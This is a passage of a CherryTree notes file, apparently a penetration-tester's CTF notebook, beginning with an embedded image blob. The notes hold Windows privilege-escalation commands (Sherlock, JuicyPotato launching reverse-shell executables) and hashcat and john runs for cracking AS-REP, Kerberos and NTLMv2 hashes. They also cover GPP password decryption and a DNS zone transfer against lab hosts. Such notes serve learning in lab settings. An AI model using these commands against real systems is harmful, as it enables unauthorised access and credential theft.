uObAY3OZ4VrRRXJjX2z+g1enKq+oo49bE1DTSjdKSE1BIkF1FA2aoNF4TvdABtDodSl/18/WxVBuFx+W6uvCkMjnVbAYA3Fxdnnz4vj17P1er1VdulF+5Ue7p4R4XHZUQF52WnGj6Y54Wzw7b30I5EgDw9/NBbpcZicSP7bjvyUZioyM7hT0kSSIJ2NM3gLKbKTUFAJIT446cOEOSZDu/KzsjdWh4FNld7ApmtQvKF+lnrrCLJRy+vMkJcV3dvdPimbHxST9fb71ej2ozoTzK9NSkkYtjzW0dyGpOBbMaPVdSkxI2rFlx+vxlpVJ1+Pjpw8dPBwb4J8RGJcbHJsbH2tKecWJy6oNPPjN9/endj5gWujfLssI8swXMKRpb2izprBHhoQw6XavTUWooCgwICvCnPBU0Gi0xLqa+qbW1oxO1F6KiRGw0mi5fuqSusUXY0zc2Pvnl6QsLibakoLLIbbFZWicxPsb0Um9at+rE2YtIkfrw08/tqqjF5XB+9/PnTZd21EpMrZ4/t109FzfFZN5yc0fHxtHNyslMM1racdjszNTkqrqGdn6XUaC27ej1eiTGDcNsqDHoTDvB2wwqdIDSxYzeWpKbdebCFQAoq6yxpLOiY5MT4pIT4rQ6XWdXd2NLW219s1yhmBbPvPfx/jUrllFlcZ2OYq7gjAMGXYIgOBy2j5dXZHhobla60a+GerhYk2Bzvvhp8WyykVPuCBj4K6zU06VQzOk080o2zpwC+kWt7JFCNwJgR7YLpVQRc72vJmX6S+2z52RZiA2gUGrIYw3yYw1yNw5RFMNZlcQrjuMwaJAczPxwd8BvDk9c6pj/K9jIuFR/yqCr6huXZn63zWtNErcknvOdYvc3L88AQLAn46UdZh5VP9o/Xtalsn3h59jy2/agXpFE92WD7P58VwDIDmeb6qx2zYHF4LbGBszZTbMz07748rRcobheXrWqpAgphTfKqyg3rtH+tkAVz3JKFjZV9IprzqFMgWxCRvcyNSnhf3/63LlL16rqGpRK1bR4pqquoaqugcFg5GWlb9241tAqI1fMTn225QQUyvJkpUCYE4mNiYLzlwGgq6c3OTEOmdbodHpi/M3yJUEB/shh19bRmZ2R2nWz6VHkIo2KepBbuVCmOHx5kxPjULEtfpfQz9e7u7cfrWGQ4p6eknT24lWpTI6q1lHBrCkmRo7N61YlJ8Sdv3ytuY2v1+tHRkUjo6IrNypcXVxWFBeuWb7U4cjCrwAmgxERHtrV3ds/OKzWaIAkUT4WFRiASE6Mr29qHRWNI01I2NMPAMGBAdYTlikIgnj4vu0v/eMNjVZ7+XpZVnqKJc+G7czMrXBstEbbC0EQm9etamhuGxkVdQiEg8MjptVIIsJCf/rcdw1fefO9j1CSTWNL+xKTeCS7fHCyOQFl5IymqlnpdfpL18qMh00jAABlNzrW2IYqRmsoxFzm9G+Fo5YYuULR2NwKAB7ubmYLeLm6uEhlspqGpp3bNs6bq8eg05PiY5PiY3ds2XCtrOr4mQsajeb85etBgQH5JgqxU6Aau6AEYuv848XfWl9GGnLzSWS5GAtV8IsKY134HUEQxKyLxhbNidp53ovAnJN5Q9O68i5VYQy7KJYT6EFH6fAF0ewQTzoAHK2XUTGpTJvFpERJnmlRnGlR+LjSvlvivj3LhUWHP9zt8/B7o73mylQtHJWW/L9jU1nhbB8X2n15rh/ckFBFuCyh1s7uwLDQEohS0ZUG6Vaq+Y6imTtqXmr7VEhnDfY0My3tmgOLwe3UWalWCkwGoyA369K10vGJSb5AmBAXo9PpUDCTn683FeNlV+sFKlpRY08UrOWzUeFi1s6GqgqYWk+9PD3u275l57aNPX0DnV3dnV3dgu5erVZbVlXb3Mb/8TO7/eZC9alho1hJ859yM6DekY6C9hIVHorCSZGCgvLEY6MijOJBUcUrZBqn7HAxi6azUkERGnus7w5f3tDgIHc31xmJlC8QLi3IRVWuIsJCUKh0eGgwUtmbWttRaC8AeHt5mrWFREWEfeexB5VKVaewRyDs7hAIB4dGpDLZ8dPn29o7n/nOo1ZWWaHBQa+/7GASlVOIjY7s6u7V6/U9fQOquaA9Q4s7GKSdtXZ0xkZHIuXeLou7n6/P5g2rjxw/Q5Lk3gOHf/7jZxY47N65yixB8+VNOwxBEEnxsaiklLC7z1RnNWXbprXo93LizIWczDSjCUlFPPcPDpvaGg3R6XSoIC6TyTTMUqe6EAGA2W4sFOVVtetXL3eguj5KCQAAw2wMqq08Shu3gkarnZ6eAQLYTKa7QZ+kqtoGNLWmxTNWXOcqlbq2scVU3bcEk8lcVVIU4Of79p5PAODMhSuLpLNSVnO78oZtgZJgpoHLFDcl2NyTaOF3BEF9HR5v/mw2qkakaj5HgeG8O1gjLYxhEwDbs1zeujwDADuyXQGABDhct6AAygmp/qWT03IV+dASVzYDHipwffGkTV1VHUClJcu6ZhslhHsz+KMa/qgm/88W60NJlLM6JZdl/jfoypnVFKkCAgAgnTuKZ89R8zItnz0tVc3AELvmwGJwO3sKGFI8l0l9rbwKABqa21Da7LIl+Y71KaEMKuKZGet72gKLxUI5p+MTFpvzSmUyZGG1VNyETqfHREVsWLPiue898cdf/xTFkEmk0s8OH6f2oY5FfYPMMjo2K3c8POYpsOoUmEwmqjDVPzgskcoGhobBxLQGczZF8YxkeFTUPzgIAIEB/o716bYFKq9ucsoOubOQy4sc/XxBN8xVZk1Nng0QJAgiLTkRABpb2mEu5sx6JBmHw05LTti+ZcMvnn/mF88/g6Kcu3p6L821q7kzoQzn/YNDbR0CAODxuEZ2UA93N6SxtfMF/XNh5fZGiawqLkI1d0bHxk9aKLVrI3q9HhXxBYCEOGu1zRcINdvltjlAQoODcjPTAWBaPHPlernRuzHRs05hFDltBUF3LypcHR0Zbigtm9s6qOID1pmYmuZbaLBinfrG2dLiiQYXNjgoANk+BwaHrTsQ6xqa//Dyq3/466snzt1yi8sqLXZnNcKwLQJJkoeOnTp07OTRk2etHJKSFI8CIURj46ZdY5wCVaBA7eycP09PSoJZfBJREszTfXbnhd8RhEplR/0B7pzOqrZHcb8hUCLz6rZMFwYN/NxoxfEcALjeqbRUhRQR7s14YZ3HC+s8UJsrS3xePesZSAu1tWq4WZKCmDkR7JwItqVe6VNzUaq2tMIak+iQ+96saRMAqKYAQwadq6gLMu9Rhv2uPHm0tBBWWgjL3ULnBR7LmqZr1xxYDO6UXpF+vj4JcTEdnV1NLe3iGcn18ioAYDAYtq+hjaAKeQp7+szWARgcHmlobgOA3Mw0K7FBFNGR4S3tfJlc3jcwFD5XldAQZIAEgJjI2YcNSZKVNfXkbMvpWxIg3N1cH3/w3t+++HdkutNqtSjyKToyAuk9bXyBYaMBismpaVS4MTw02HaP0gKJjY4U9vSp1erahib0ipFpDQASYmOQOZYv6B6fmILFDAwAAF8fb5TrI+zp0+l0NrrUF3J5kxNiK6rrpDJZQ/NsxGeageKenpJ0raxybHyiua3DtDIrAIhnJMioFujvZxSEFxIc+MTD9734938DQEt75/rVy226BLeDqMhwVEJBJBrv7u0HgJTEeNNVJap4JezpC5gzFtqrs6IIgb+8+qZWq71w5YYDhfopKmrqUfur6Mhws20tnQUVQ+9iszTfsmF1XVOLTqc7e/FqUX6OoYsmODAgMMB/ZFSEcsCttMK6OleOIDv9lqtE2VZ/9/PnLX3xwaGRv7z6JgCUVdbY27FpVDRe29gMACwWyzCliUajpSUn1NQ3aXW68uo6s9n9CCqHLzriZqZs38DQ4PAIAORlZzx6/05Lx7774aeNLe3Cnr7RsXHUwIIgiMraeqSGrl6+1ErOPpfDmQIxAMgVClvSpOyFzWahYsaGuQ1Ogarg28bvNFvRHADQYpJGo0WEzz4EF3hHKKg2crbE2FBmBbsugp6Ew3Wyp1e4+7jQlidwo3wZyC1+qGae1ReTDvfnuQKAcFx7pN7izlLVrCrpZrlXli38aLVHdgQbALa8PiIy1+zKy2VW8xMr5vfLq7TQO6GN8mXE+TM5TMI0liA5eNav2DV202jNH53dTg1h3RAYL0UIgKQgFgBIVaRIcnOEiYHM1x7wBYC3r8x8YFJTDADiAmYdfUPTZnyYds2BxeBOsbPCXNyqXq8/evIs8q5mZ6Q6LFAiw0PRb6a2sZkqumHI1dLKU+cunTp3ycaIg5ys2V7zKPzfCL1ef+HKDaM9CYI4cuLM3gOH93zymWmTQDqd7unhAQAkSVKOnqz0FKQBXL5WZnZ5eu7ytdlPyUy3adxzUNnidoVYICiFo7SiBgAC/H1NH4FsNguVaCivrnWgm4C9EASRlpQIAHKForK2wXSHnr5+0xcXcnkT42PRsUdPngEAL08PQ/9vXEwkMq4cOXEGAOh0enzMLRqAQqHYe+Dw3gOH0Q5GUEUD1OqvohSLw7CYTFRhp6dvANXcMV29AABSsFBbYwAI8Pc1m0pvnQB/301rVwIASZJWOvFaZ3Bo5NCxk2jbqKyyc9FqtQ1z/UvDw8ysac3i4+21bEkuACiUytMmgmXtimVo48Dh45YspnWNzciK7Obqkpt1c9KKZyRoFR0RFmpFUw8JDkR9sBqaWu1KBJYrFHv2HkChiiuLC41Kn1IdJU6dv2SpX65obAJdMRaTmZF6U+VFva8AwPDrmJI7Vy4aRZEhkuNnF4oXLfsrxDMS5CKn0+keJu5vp0AQBOoEMTY+4YC8tUJYSDAKJGtt76SqpBlS29CMWkAnJ8QZWsIWckcokFOLyWT6+82f+xscGIAeOqMmdR6tc6xehlLF7s1xQUbTIbGuXDiP76J7XIs0s2hfxpJoizbU/KjZiWposHQA/lzt0pI4My5yBg0KojgAoNKCQGSTmbmsSwkATDqsSTKj82xM5RnuhqjqUaELtSGVRzdR5XIj2b6uNKNDAKB1SI3Cglclck0z2egEbJrrMVbTa+ZhZNccWAzuIJ01LTkBSZCqORVkIcXV6XT6yuIiAFAqVR/tO2gU/VNT34ScSjFREQH+8xtZASAnIw2t5htb2ozUVr1ev+/QMdRiJz0lMSzk5hMLFT/S6nQHDh83El7dvf3Iz+7l6UEJF28vT2RanhbP7Nn7uZGmW1ZZc72sCh1i1Cl0XijpPDI6T0iTKdER4Uj6oO9oVk0BgOTEeACgJOmi6qwAQNUs/OLYKWTzo+js6j44p6kYspDLy+NyUZ1I5JVLS77FcE6n05Gihsy0MZHhRmXIAvz90I+cat9lCAqJAYBgG+Igby+x0REwNxNoNJrZqmFREWEovRRNBkstW+dl9fKlRt16bUev15dV1f7zrfdQCYtlhXkL6fxuHY1G89H+Q8ieFBjgbygB5mX96hXIb3uttMIo0CUvOwM5Kyanpv/19vtU8CiCJMmrpRUf7juE/tyx9ZZspIrqOiRwrGt+1A5ana6qttHGMQuEPX//9zvIGhoaHGTqGYgMD0UFChUK5evv7EF7GjIqGn97zycopGHdqhIqGVmj0VTXNQKAqwsv0WogR2pyAgrurKiuo7J81q8uQVnq5y5dO3n2omnarnhG8t5H+9H+GalJi1cOGS3ttDodcjo5C4IgUA1skiTf/2S/0YTpGxja/8UxAKDRaBvXrjB8y+E7QkGSJDoqLCTIlgZITCYTRTmjIG/bmZirD5AdwUbV7w/XyubNfNeT8O7VWYPuSzt9VpvT/NJCWD9dP2sdONtiU1dVS1BNWZ9e4ZEYeMssIgBeWOfp50YDgNPNcpVtCRfHG+XoK/5glQfKOaO4J8clI4wFAM2DasO8MbFCf4WvAIAQT/qzK2+p++HBpf1sw+w3Pd5wy3J3RklebFMAQHwA89lVHkaxDc+t9ojyZQBAba/KtGiAvXNgMbhTYgMAgEajLS3IPXnuEvozNDjISh0TW1hVUtTc1tHV3dvGF/zpb68V5Gb5+/lIpfKWdj7qR8rlcnZt32r78J546L5/vPmeWq0+fuZCcxs/OyPFzdV1alpcWVOPFu4e7m67dmwzPGrj2pVNbR0SibS8uq67tz83K93by1OlVvf0DdQ2NCPRuWbOmoLYuW2TsLdvVDTe3Nbxp1deX5Kb5efro1AoG1vbUG1OGo320H3bTWWKdQL9/VChorrGZjab5e/r4+7mmm+uGr8pbDYrLCSIemRa1lnjKCOiv5+P9R7TCyciLKSkqOBqaYVSpfrnm+9lpCZFhIVqtdru3v42vsCSeWMhlzclMY4y3xrprACQnpqI+nXBnPpuCEEQO7dt+s+evXq9fu/nR6rrGpMS49zdXA0nJJ1OX1Wy6H0iFkhcdNT5y9fRdkxUhNneQlTFK/Snw6sXdC9efvWteWuGDA6NoPUGCaRcoRwfn2jjC1BXEQDIzki9Z9smqyewlebWDsNQQp1ONz4xWd/cihpe0On0+3dstSsE383VZXVJ0anzl7U63fHTFx594KY3nCCIJx7e9drbH4yIxkZF46+8/p/w0JDw0GA2mz0jkXR0dlFp+2tWLDPSTVFZVoIgcjJSrQ8gNysdtVYqq6oxdTdLpVJ0YQFApVZPi8V8QTfVAjcowP/7Tz5sNkhp57aNo6Kxru7esfHJl//1dmJcTGR4KIfDkcvlvf2D7Z1d6BeakhRvKADrm1pRClFWRqr1hyKTwchIS66orpNIZc1tfBR8FRjgv/vR+9/7aL9Opzt1/vK1ssrkxPgAP18Wi6lUqgaGhlvbO1HWprub6/YtTiijZomoiFD0KxEIu037pCyEvOyMNr6gqrZhfGLqxX/8e0luVnhoiE6vF3b3VtY2oGfKxjUrTDsOOHZHKIZHRWj5F2Vz6++o8LDBoRHxjGR8YtKusJyDNdI1ybNKp1YPxyz7+g05Wi8P8WQ8vtTNhUW8tMO7b1Jb2a0aFmu1OvB2oaWHsrPCZxd1Nb2qw7ULyujqGNHsLZc+tMTVjUN88IT/2RZ5fZ9artEHujPWpXDjA5gAMDqje/uyeZO2KQKR5nCtbEe2i7cL7ZOnAo7Uy/ijGg6DWBrLKYnnAICOhFfPG5/t3xfFRTEcDpN4eIlrSjDrQpt8RqkP92beneUyZ2RVlZl0YX3tojgviu3Foz28xDU/in2pXTE4rfPi0dalcFOCWQCg0pIvnzaTKOLAHHA6d5DOCgBFBbmnL1xBv7riwoVW2KbRaN9/8uE9ew+0tndOTYtPn79s+K6fr/fjD95rV/OxkODAH33/yfc+2jc1Le7p6zfyPoeGBH3v8YeMFDVPD/cffOexPZ8cGBGNjY6Nn7g1m4QgiHWrSkqKbnlOsNms559+6r2P9nV1905OTVNKPMKFx3vq0fsdUAJ4PO6ywvzL18tIkkQ25uyMVBt1VgCIjY5EOiuXy4m20KYhKMDfy9MDOZ5iHTWt2cXObRtlcnlNfRNJkvVNrZSSRKPR7tu+5bMvvjQ9ZCGXNykhDt1BDpsdG2O8T3JCPFoVgIWeBckJcY8/eO/+Q8fkCgUqb274LofNfuT+naHBd7qdNToqnCAI9HiztHqBuYpXaHshFvegAP8Na1cipcoKbXwBChc2gsvhbF6/uqTIwVROU66VVVp6y9WF98j9Ox3o3bV6+bJrZVVSmayqrmHV8qWGc8DN1eXHzz61/9CXKDqib2Cwb+AWayubzbp703qjbsACYQ/KFo2PjXabb+no4+UZHRku7OkbHBrpHxwyMhJPTE1/dtjM74hGoy1dkrtt41qz/eQAgMVkPvudxz4/fLysqlav17d2dKL+eYasWLbkrk3rDIPRqZyqXBtin/Ky0iuq69BRVMJAalLCj5/Z/fmRE739g1KZnKqcYEhMVMQj9++0lCzrFFISE1CHsDZ+V6GdPrF5efi+7VwO52pphUqlNmyuBqgr+NaNK+Z8UIY4dkcoqISN7Mx5VkEUWRmpKDWljS+wy2ta26fuHtcig9+FNsWU3NZSTW9enhGOa59b5eHnRgv3ZoR7m9FwjtbLXzkzrVtwyMZrF8RaPflokRuDBpvSeJRLHdEp0vz84IRd/QJeOTPtyaOtSuS6sImHCm752aq08Kfjk40DxmEGA1O6Fz6bePleH1c2kRXOopRyRF2f+leHzWQbi2Z0P9g7/vK9PiGe9PgAZnzALXZisUL/PwcnhCZGVnBoDjidO0tn9XB3S0tOaGhu47DZ87q0bIHDZj/95CMtbfyKmrru3n6pVMZmswMD/HIz0wvyshzIYQoPDf7Nz354o6Ia1WKUK5RcDic0JCg3My0/J9OsYSA4MOAXP36mqrahrqllaHhUIpXRaTRvL8/YmMhlS/LM1sRxdeE9//Tu+qbWqtqG3v4BiVTGZDIC/f3SkhOLC/MdjvG9a/M6BoNeXdc4I5G68LhG7UOtExcdhQJ2kxPirNg/khLiSiuqYc6DvNjQaLTHH7w3IzXpenn1wOCwWq12d3dLiI1etXxpoL/f4S9Pm60I4/DlDQ8NRm0jkhLMtABgs1kJcTEt7XxPD3ezCV4AkJWeEhcTVVZZ09TaPjY+KVco2CyWv59PckJccWH+vOrFnQCHzQ4LCUJ95qzprHMpaL4+3guMGly7YllDU2v/4JCN+zMZDHc315DgwJTE+JzMdNNecWPjkygsxwpIxfX18bG+imDQ6VweNyQoIDkhfklelmMd7dls1oY1yw8ePQkAR0+cefY7jxm+y+Nyn3z4vt7+peXVtQJh7+TUtFar5XE5gQH+KYnxhfnZpoVvqewrG6VoblY6qk9XWlmza7vFwAY6nc7jcYP8/eLjYvKzM+ZtQ8BkMB689+6SpQUV1fV8gXBKLFap1BwO29/XNy4msjAvx8gAOT4x2SnsAQBvL09bivLGx0ajCnQt7XzxjISaZhFhoT/5wXc7Zis8wAAABiFJREFUu7obmtu6unvFMzNyhZLFYnp7ekaEhWRnpBnWll4k2GxWZnpKZU19W0enWq2et4isXdBotHvv3lyQm3m9vLqzSygWS0iS9PH2SoiLKVlaEGA5pdjeO2JIQ3MrAAQG+JvtGWuWuOhIZMWob2yxN9Lvi1rZT9Z5AMChGum8Oxtyull+uUNRHMdZHs9NCGT6utI5TEKq0vdNauv71CeaZEInNcEiAd64NHOqSb4zxzUnkh3kQWfRiWmFvn1Yfa5VcbZFrrVDXwUA0OrhF4cmi+M4m9N5qSEsLx5drSNHZ3QVQuVnldIhC2UTqntVO98c2ZXnujSWE+LF4DCJabmeP6o+06I43SS3pJl3ijQPvDO6NYO3KpEb68905dBkKrJ3QnO9U/l5tVRqocuBA3PA6RDOjRDHYDCYO5xL18qsN8ykKCkquPfuzYs9Hsw3EoGw519vfwAAu3ZsXaTGvF8Zw6MiVNhk+5YNq0qKbD/w1PnLqFbd//70h1TqiJVKpZg7jcpfz6qnDs8B53IH5WBhMBgMBvPNIDY6EsUIXble/nW3DaEmal6eHvbG7K1cVoiKjl2+btyGDfP1wuE54FzurNgADAaDWWxWFhdaKVGJwTiLHVs3vtT5xohorLy6rjAv+3YPx0FGRkUobvjuzevsrbTA4bC3blyz7+DR0sqaFcWFVuIWMHcyC5kDzgXbWTEYDAaDcT6B/n7Ii3r4+Gmn9xf4atDpdJ8ePKrX6+NjorIz0hw4Q2FedmR4qF6v33vgMFWVDPM1YuFzwIlgnRWDwWAwmEVhy/rVURFhCoXy3Q/32dXF9E6AJMkDh4939/a7ubk++sA9jp2EIIgnHrrPhcfr7u1HiYaYrxFOmQNOhP773//+do8Bg8FgMJhvIDQaLT01qbmNPzg8Mioaz56vXO4dxZkLVy5eLeVyOc9953HUf8sxuFxOXExkbUOzsKfPhcc91zNPxQnMnUO4utYpc8BZLHo869c99hyDwXxrcVZVVxvB0vIbCY/Lff7pJ/fsPeDn6/31usV+vj7+vj5PPfZAoL/fAkceHhryo6effO+jfX6+PvC1ugjfcuyaA1+BwFyUWldfr58lBoPBzMsiiWMsLb89KJUqe/sX3l60Wi0AMOwvZG4JtUbDoNMLX5qnOjLmzuHGzwPAoTmwSAKT0Ov1Tjy1JfmL5TIGg/kaYUkqYmmJwWAwRnwFAnP2hFQe3wJPbSpnrUteLJcxGMwdgnXpZ/oulpYYDOZby1csMG85lVHtCQdObSRPrf+JwWAwXxeM5KH1P20BS0sMBvNNxekC08xH6HQ6o3PZdV5DIWtp2/RPDAaDuZOxIm2xtMRgMBhDFkNgmv8gpLM6dl6zYtd0w+yfGAwGc2diSf6abpjubAksLTEYzDeSxRCYFj8LJQZa/wyzWBG7ZgUx2v6Ka8dgMBiM7ZiKKSuyEUtLDAbzbWaRBKYVCI1Gg46367yWBK7hv2gDnQRbETAYzJ2MWVMBJcGoV7C0xGAwmMUTmPN8rkajsXR2S+c1tQeY/ZcgCCOhDFj+YjCYOxhT6YfkmKmExNISg8F8y3G6wJwXBiUujf615WCzwtfQWmBqSHBgiBgMBvPVYEX6UV4wLC0xGAwGFlNgWoJQqVQEQVhRh40+wIp7ixK7lt41ex4MBoO5vZj1c1mSh1haYjCYbzOLJDBtgQEm6rC9pzAVwSwWy96TYDAYzJ2MWq0GLC0xGAzGBpwiME2hof8sLfrh1iW+lX2wCMZgMN9gKMmGpSUGg8FYx16BaSM0Sgs2OrWNUIeYzXjFYDCYbwxYWmIwGIyNLFBgmoVheBbKcms9WtY04srU4YXBYDDfMLC0xGAwGBtxQGDOC406qeEZzX6wpdetH4vBYDDfDLC0xGAwGBuxXWDazs0cLAq7lF/KWoDNBhgM5hsPlpYYDAZjIwsRmGahkeaMt6afZGUcth+FwWAwX1+wtMRgMBgbWQzRd4ud1WEVmJzD4XFgMBjMnQ+WlhgMBmMjCxeYRjAMI2FNlWLTOFmjii1GkhcLYgwG800FS0sMBoOxEXsFpi3QwHmiE4tgDAbzzQZLSwwGg7ERpwu6/wcqgtGTvXcDSQAAAABJRU5ErkJggg==</encoded_png>
          <codebox char_offset="972" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="990" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell-import Sherlock.ps1</codebox>
          <codebox char_offset="998" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell Find-AllVulns</codebox>
          <codebox char_offset="1469" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\&lt;juicypotatofilename&gt; -p &lt;executable&gt; -l &lt;port&gt; -t * -c &lt;clsid&gt;`</codebox>
          <codebox char_offset="1483" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\jp.exe -p C:\Users\merlin\Desktop\privesc.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
          <codebox char_offset="1503" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">jp.exe -p rev1.exe -l 1337 -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
      <node name="DNS" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700383990" ts_lastsave="1700384143">
        <rich_text scale="h2">Perform nslookup first </rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


once u know the subdomain u can use this for a dnz zonetransfer to identify more subdomains:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="25" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nslookup 10.10.10.58 10.10.10.58 </codebox>
        <codebox char_offset="123" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @10.10.10.58cronos.htb</codebox>
      </node>
    </node>
  </node>
</cherrytree>
